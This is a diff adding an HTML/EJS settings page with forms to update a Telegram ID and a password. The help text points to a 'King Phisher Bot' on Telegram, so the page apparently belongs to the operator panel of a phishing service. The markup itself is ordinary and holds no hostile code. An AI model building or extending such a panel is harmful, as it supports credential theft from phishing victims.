@@ -1,0 +1,51 @@
+<div class="main-panel">
+  <div class="content-wrapper">
+    <h1>Settings</h1>
+
+    <form
+      action="/update-telegram"
+      method="post"
+      class="form mt-4"
+      style="max-width: 500px"
+    >
+      <%-include("./partials/messages")%>
+      <div class="mb-3">
+        <input
+          type="text"
+          placeholder="Link name"
+          name="telegramID"
+          class="form-control text-white"
+          value="<%= req.user.telegramID%>"
+          required
+        />
+        <small class="text-white"
+          >Change this if want to use a different telegram account or the
+          previous telegram code is incorrect. To get new ID send "start" to
+          <a target="_blank" href="https://t.me/KingPhisherSocial_bot"
+            >King Phisher Bot</a
+          >
+          on telegram
+        </small>
+      </div>
+      <button class="btn btn-success">Update</button>
+    </form>
+
+    <form
+      action="/update-password"
+      method="post"
+      class="form mt-4"
+      style="max-width: 500px"
+    >
+      <div class="mb-3">
+        <input
+          type="password"
+          placeholder="New Password"
+          name="password"
+          class="form-control text-white"
+          required
+        />
+      </div>
+      <button class="btn btn-success">Update</button>
+    </form>
+  </div>
+</div>
